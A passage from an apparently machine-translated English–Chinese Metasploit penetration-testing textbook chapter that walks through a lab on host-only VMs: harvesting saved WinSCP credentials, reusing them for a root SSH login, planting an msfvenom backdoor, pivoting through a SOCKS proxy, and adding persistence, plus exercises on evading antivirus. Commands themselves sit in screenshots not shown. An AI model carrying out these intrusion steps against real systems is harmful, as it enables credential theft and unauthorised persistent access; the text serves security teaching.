  zh: 拥有最高级别的特权，让我们进行一些后期利用，如下所示：
- en: '![](img/28ac3198-637b-4948-a8fc-d3b9375feded.png)'
  id: totrans-358
  prefs: []
  type: TYPE_IMG
  zh: '![](img/28ac3198-637b-4948-a8fc-d3b9375feded.png)'
- en: 'It is always great to look for the various kinds of applications installed
    on the target system, since some of the apps may have saved credentials to other
    parts of the network. Enumerating the list of installed applications, we can see
    that we have WinSCP 5.7, which is a popular SSH and SFTP client. Metasploit can
    harvest saved credentials from WinSCP software. Let''s run the `post/windows/gather/credentials/winscp`
    module and check whether we have some of the saved credentials in the WinSCP software:'
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标系统上查找安装的各种应用程序总是很好，因为其中一些应用程序可能已经将凭据保存到网络的其他部分。枚举已安装应用程序的列表，我们可以看到我们有WinSCP
    5.7，这是一个流行的SSH和SFTP客户端。Metasploit可以从WinSCP软件中收集保存的凭据。让我们运行`post/windows/gather/credentials/winscp`模块，并检查我们是否在WinSCP软件中有一些保存的凭据：
- en: '![](img/0d77f33a-f2c8-488f-a614-cffc1b2e1412.png)'
  id: totrans-360
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0d77f33a-f2c8-488f-a614-cffc1b2e1412.png)'
- en: 'Amazing! We have a rescued credential for another host in the network, which
    is `192.168.116.134`. The good news is the saved credentials are for the root
    account, so if we gain access to this system, it will be with the highest level
    of privilege. Let''s use the found credentials in the `ssh_login` module as follows:'
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: '太棒了！我们在网络中又救回了另一个主机的凭据，即`192.168.116.134`。好消息是保存的凭据是root帐户的，所以如果我们访问这个系统，将会拥有最高级别的特权。让我们使用`ssh_login`模块中找到的凭据，如下所示： '
- en: '![](img/f5067b71-81c3-4c55-8408-b6d42ed3c69f.png)'
  id: totrans-362
  prefs: []
  type: TYPE_IMG
  zh: '![](img/f5067b71-81c3-4c55-8408-b6d42ed3c69f.png)'
- en: 'Since we already know the username and password, let''s set these options for
    the module along with the target IP address, as shown in the following screenshot:'
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们已经知道用户名和密码，让我们为模块设置这些选项，以及目标IP地址，如下截图所示：
- en: '![](img/41815fcf-23e8-4ff9-b7f7-5b97993badf3.png)'
  id: totrans-364
  prefs: []
  type: TYPE_IMG
  zh: '![](img/41815fcf-23e8-4ff9-b7f7-5b97993badf3.png)'
- en: 'Bingo! It''s a successful login, and Metasploit has gained a system shell on
    it automatically. However, we can always escalate to the better quality of access
    using Meterpreter shells. Let''s create another backdoor with `msfvenom` as follows:'
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: 太棒了！这是一个成功的登录，Metasploit已经自动在其上获得了系统shell。但是，我们总是可以使用Meterpreter shell升级到更好的访问质量。让我们使用`msfvenom`创建另一个后门，如下所示：
- en: '![](img/18dfd8cf-23e7-4804-a155-62ba7d008754.png)'
  id: totrans-366
  prefs: []
  type: TYPE_IMG
  zh: '![](img/18dfd8cf-23e7-4804-a155-62ba7d008754.png)'
- en: 'The backdoor will listen for connections on port `1337`. However, how do we
    transfer this backdoor to the compromised host? Remember, we ran the socks proxy
    auxiliary module and made changes to the configuration? Using the `proxychains`
    keyword as a suffix for most of the tools will force the tool to use the route
    through `proxychains`. So, to transfer such a file, we can make use of `scp` as
    shown in the following screenshot:'
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: 后门将在端口`1337`上监听连接。然而，我们如何将这个后门传输到被入侵的主机上呢？记住，我们运行了socks代理辅助模块并对配置进行了更改？在大多数工具的后缀中使用`proxychains`关键字将强制工具通过`proxychains`进行路由。因此，为了传输这样一个文件，我们可以使用如下截图所示的`scp`。
- en: '![](img/5901e805-d31f-4ac6-a397-9a1761e419e5.png)'
  id: totrans-368
  prefs: []
  type: TYPE_IMG
  zh: '![](img/5901e805-d31f-4ac6-a397-9a1761e419e5.png)'
- en: 'We can see that we have successfully transferred the file. Running the matching
    handler, similarly to what we did for the first system, we will have the connection
    from the target. Let''s have an overview of all the targets and sessions we gained
    in this exercise as follows:'
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到我们已成功传输了文件。运行匹配处理程序，类似于我们为第一个系统所做的，我们将从目标处获得连接。让我们总览一下我们在这个练习中获得的所有目标和会话：
- en: '![](img/c78c60d9-bf26-4f1d-a7e2-66977bb14529.png)'
  id: totrans-370
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c78c60d9-bf26-4f1d-a7e2-66977bb14529.png)'
- en: Throughout this practice real-world example, we compromised three systems and
    gained the highest possible privileges off them through local exploits, human
    errors, and exploiting software that runs with the highest possible privileges.
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个实践的真实世界示例中，我们通过本地漏洞、人为错误和利用以最高特权运行的软件，成功入侵了三个系统，并获得了最高可能的特权。
- en: Revisiting the case study
  id: totrans-372
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 重新审视案例研究
- en: 'To set up the test environment, we will require multiple operating systems
    with primarily two different host-only networks. Also, we will need the following
    components:'
  id: totrans-373
  prefs: []
  type: TYPE_NORMAL
  zh: 为了设置测试环境，我们将需要多个操作系统，主要是两个不同的主机专用网络。此外，我们还需要以下组件：
- en: '| **Component name** | **Type** | **Version used** | **Network details** |
    **Network type** |'
  id: totrans-374
  prefs: []
  type: TYPE_TB
  zh: '| **组件名称** | **类型** | **使用的版本** | **网络详细信息** | **网络类型** |'
- en: '| Kali Linux VM Image | Operating System | Kali Rolling (2017.3) x64 | `192.168.174.128`
    (Vmnet8) | Host-only |'
  id: totrans-375
  prefs: []
  type: TYPE_TB
  zh: '| Kali Linux VM Image | 操作系统 | Kali Rolling（2017.3）x64 | `192.168.174.128`（Vmnet8）|
    仅主机 |'
- en: '| Ubuntu 14.04 LTS | Operating System | 14.04 (trusty) | `192.168.174.132`
    (Vmnet8)192.168.116.129(Vmnet6) | Host-onlyHost-only |'
  id: totrans-376
  prefs: []
  type: TYPE_TB
  zh: '| Ubuntu 14.04 LTS | 操作系统 | 14.04（trusty）| `192.168.174.132`（Vmnet8）192.168.116.129（Vmnet6）|
    仅主机仅主机 |'
- en: '| Windows 7 | Operating System | Professional Edition | 192.168.116.133(Vmnet6)
    | Host-only |'
  id: totrans-377
  prefs: []
  type: TYPE_TB
  zh: '| Windows 7 | 操作系统 | 专业版 | 192.168.116.133（Vmnet6）| 仅主机 |'
- en: '| Ubuntu 16.04 LTS | Operating System | 16.04.3 LTS (xenial) | 192.168.116.134(Vmnet6)
    | Host-only |'
  id: totrans-378
  prefs: []
  type: TYPE_TB
  zh: '| Ubuntu 16.04 LTS | 操作系统 | 16.04.3 LTS（xenial）| 192.168.116.134（Vmnet6）| 仅主机
    |'
- en: '| PhpCollab | Web Application | 2.5.1 |  |  |'
  id: totrans-379
  prefs: []
  type: TYPE_TB
  zh: '| PhpCollab | Web应用程序 | 2.5.1 |  |  |'
- en: '| Disk Pulse | Enterprise Disk Management Software | 9.9.16 |  |  |'
  id: totrans-380
  prefs: []
  type: TYPE_TB
  zh: '| Disk Pulse | 企业磁盘管理软件 | 9.9.16 |  |  |'
- en: '| WinSCP | SSH and SFTP | 5.7 |  |  |'
  id: totrans-381
  prefs: []
  type: TYPE_TB
  zh: '| WinSCP | SSH和SFTP | 5.7 |  |  |'
- en: Revising the approach
  id: totrans-382
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 修改方法
- en: 'Throughout this exercise, we performed the following critical steps:'
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个练习中，我们执行了以下关键步骤：
- en: We started by conducting an Nmap scan on the target IP address, which is `192.168.174.132`.
  id: totrans-384
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们首先对目标IP地址`192.168.174.132`进行了Nmap扫描。
- en: The Nmap scan revealed that port `80` at `192.168.174.132` is open.
  id: totrans-385
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Nmap扫描显示`192.168.174.132`的端口`80`是开放的。
- en: Next, we did a fingerprint of the application running on port `80` and encountered
    Apache 2.4.7 running.
  id: totrans-386
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们对运行在端口`80`上的应用程序进行了指纹识别，发现正在运行Apache 2.4.7。
- en: We tried browsing to the HTTP port. However, we couldn't find anything.
  id: totrans-387
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们尝试浏览HTTP端口。但是，我们什么也没找到。
- en: We ran the `dir_scanner` module to perform a dictionary-based check on the Apache
    server and found the PhpCollab application directory.
  id: totrans-388
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们运行了`dir_scanner`模块，在Apache服务器上执行基于字典的检查，并找到了PhpCollab应用程序目录。
- en: We found an exploit module for PhpCollab using `searchsploit` and had to import
    the third-party exploit into Metasploit.
  id: totrans-389
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们使用`searchsploit`找到了PhpCollab的一个利用模块，并不得不将第三方利用程序导入Metasploit。
- en: Next, we exploited the application and gained limited user access to the target
    system.
  id: totrans-390
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们利用应用程序并获得了对目标系统的有限用户访问权限。
- en: To improve our access mechanism, we uploaded a backdoored executable and achieved
    a better level of access to the target.
  id: totrans-391
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了改进我们的访问机制，我们上传了一个带后门的可执行文件，并实现了对目标更高级别的访问。
- en: To gain root access, we run the exploit `suggester` module and found that the
    overlayfs privilege escalation exploit will help us achieve root access to the
    target.
  id: totrans-392
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了获得root访问权限，我们运行了`suggester`模块的漏洞利用程序，并发现overlayfs特权升级漏洞利用程序将帮助我们实现对目标的root访问权限。
- en: We downloaded the overlayfs exploit from [https://exploit-db.com/](https://exploit-db.com/),
    compiled it, and run it to gain root access to the target.
  id: totrans-393
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们从[https://exploit-db.com/](https://exploit-db.com/)下载了overlayfs漏洞利用程序，编译并运行它以获得对目标的root访问权限。
- en: Using the same previously generated backdoor, we opened another Meterpreter
    shell, but this time with root privileges.
  id: totrans-394
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用相同的先前生成的后门，我们打开了另一个Meterpreter shell，但这次是以root权限。
- en: '![](img/6a6c2021-a9ff-4bef-9171-439caa2406d6.png)'
  id: totrans-395
  prefs: []
  type: TYPE_IMG
  zh: '![](img/6a6c2021-a9ff-4bef-9171-439caa2406d6.png)'
- en: We added persistence to the system by using the `sshkey_persistence` module
    in Metasploit.
  id: totrans-396
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们使用Metasploit中的`sshkey_persistence`模块向系统添加了持久性。
- en: Running the `arp` command on the target, we found that there was a separate
    network connection to the host, which is in the target range of `192.168.116.0/24`.
  id: totrans-397
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在目标上运行`arp`命令，我们发现与主机有一个单独的网络连接，该主机位于`192.168.116.0/24`的目标范围内。
- en: We added a route to this network by using the autoroute script.
  id: totrans-398
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们使用autoroute脚本向该网络添加了一条路由。
- en: We scanned the system found from the `arp` command using the TCP port scanner
    module in Metasploit.
  id: totrans-399
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们使用Metasploit中的TCP端口扫描模块从`arp`命令中扫描系统。
- en: We saw that port `80` of the system was open.
  id: totrans-400
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们发现系统的端口`80`是开放的。
- en: Since we only had access to the target network through Meterpreter, we used
    the `socks4a` module in Metasploit for making other tools connect to the target
    through Meterpreter.
  id: totrans-401
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于我们只能通过Meterpreter访问目标网络，我们使用Metasploit中的`socks4a`模块，使其他工具通过Meterpreter连接到目标。
- en: Running the socks proxy, we configured our browser to utilize the `socks4a`
    proxy on port `1080`.
  id: totrans-402
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行socks代理，我们配置浏览器使用端口`1080`上的`socks4a`代理。
- en: We opened `192.168.116.133` through our browser and saw that it was running
    the Disk Pulse 9.9.16 web server service.
  id: totrans-403
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们通过浏览器打开了`192.168.116.133`，发现它正在运行Disk Pulse 9.9.16 web服务器服务。
- en: We searched Metasploit for Disk Pulse and found that it was vulnerable to an
    SEH-based buffer overflow vulnerability.
  id: totrans-404
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们在Metasploit中搜索Disk Pulse，并发现它容易受到基于SEH的缓冲区溢出漏洞的影响。
- en: We exploited the vulnerability and gained the highest level of privileges on
    the target since the software runs with SYSTEM-level privileges.
  id: totrans-405
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们利用了漏洞，并获得了对目标的最高特权访问，因为该软件以SYSTEM级别特权运行。
- en: '![](img/ccc25419-60b6-483d-9b80-88c9ddc63cc0.png)'
  id: totrans-406
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ccc25419-60b6-483d-9b80-88c9ddc63cc0.png)'
- en: We enumerated the list of installed applications and found that WinSCP 5.7 is
    installed on the system.
  id: totrans-407
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们列举了已安装应用程序的列表，并发现系统上安装了WinSCP 5.7。
- en: We saw that Metasploit contains an inbuilt module to harvest saved credentials
    from WinSCP.
  id: totrans-408
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们发现Metasploit包含一个内置模块，用于从WinSCP中获取保存的凭据。
- en: We collected the root credentials from WinSCP and used the `ssh_login` module
    to gain a root shell on the target.
  id: totrans-409
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们从WinSCP收集了root凭据，并使用`ssh_login`模块在目标上获得了root shell。
- en: '![](img/8ba576f4-f836-41cf-b47e-cbea6a91003d.png)'
  id: totrans-410
  prefs: []
  type: TYPE_IMG
  zh: '![](img/8ba576f4-f836-41cf-b47e-cbea6a91003d.png)'
- en: We uploaded another backdoor to gain a Meterpreter shell with root privileges
    on the target.
  id: totrans-411
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们上传了另一个后门，以在目标上获得具有root权限的Meterpreter shell。
- en: Summary and exercises
  id: totrans-412
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结和练习
- en: Throughout this chapter, we introduced the phases involved in penetration testing.
    We also saw how we can set up Metasploit and conduct a penetration test on the
    network. We recalled the basic functionalities of Metasploit as well. We also
    looked at the benefits of using databases in Metasploit and pivoting to internal
    systems with Metasploit.
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们介绍了渗透测试涉及的各个阶段。我们还看到了如何设置Metasploit并在网络上进行渗透测试。我们还回顾了Metasploit的基本功能。我们还研究了在Metasploit中使用数据库的好处以及使用Metasploit进行内部系统的枢纽转移。
- en: 'Having completed this chapter, we are equipped with the following:'
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 完成本章后，我们掌握了以下内容：
- en: Knowledge of the phases of a penetration test
  id: totrans-415
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 了解渗透测试的各个阶段
- en: The benefits of using databases in Metasploit
  id: totrans-416
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit中的数据库的好处
- en: The basics of the Metasploit framework
  id: totrans-417
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit框架的基础知识
- en: Knowledge of the workings of exploits and auxiliary modules
  id: totrans-418
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 了解利用和辅助模块的工作原理
- en: Knowledge of pivoting to internal networks and configuring routes to them
  id: totrans-419
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 了解如何转向内部网络并配置路由
- en: Understanding of the approach to penetration testing with Metasploit
  id: totrans-420
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解使用Metasploit进行渗透测试的方法
- en: The primary goal of this chapter was to get you familiar with penetration test
    phases and the basics of Metasploit. This chapter focused entirely on preparing
    ourselves for the following chapters.
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的主要目标是让您熟悉渗透测试阶段和Metasploit的基础知识。本章完全侧重于为接下来的章节做准备。
- en: 'To make the most out of the knowledge gained from this chapter, you should
    perform the following exercises:'
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: 为了充分利用本章所学的知识，您应该进行以下练习：
- en: Refer to PTES standards and give a deep dive to all the phases of a business-oriented
    penetration test
  id: totrans-423
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 参考PTES标准，深入了解面向业务的渗透测试的所有阶段
- en: Use the overlayfs privilege escalation module within the Metasploit framework
  id: totrans-424
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在Metasploit框架中使用overlayfs特权提升模块
- en: Find at least three different exploits which are not a part of Metasploit framework,
    and load them into Metasploit
  id: totrans-425
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 找到至少三种不属于Metasploit框架的不同利用，并将它们加载到Metasploit中
- en: Perform post-exploitation on the Windows 7 system and identify five best post-exploitation
    modules
  id: totrans-426
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在Windows 7系统上执行后渗透，并识别五个最佳的后渗透模块
- en: Achieve persistence on Windows 7 by finding the correct persistence mechanism
    and check if any AV raises any flags while you do that
  id: totrans-427
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过找到正确的持久性机制在Windows 7上实现持久性，并在此过程中检查是否有任何杀毒软件引发警报
- en: Identify at least three persistence methods for Windows, Linux, and Mac operating
    systems
  id: totrans-428
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 识别Windows、Linux和Mac操作系统的至少三种持久性方法
- en: In the next chapter, we will dive deep into the wild world of scripting and
    building Metasploit modules. We will learn how we can build cutting-edge modules
    with Metasploit and learn how some of the most popular scanning and authentication
    testing scripts work.
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将深入探讨脚本编写和构建Metasploit模块的广阔世界。我们将学习如何使用Metasploit构建尖端模块，并了解一些最流行的扫描和认证测试脚本的工作原理。
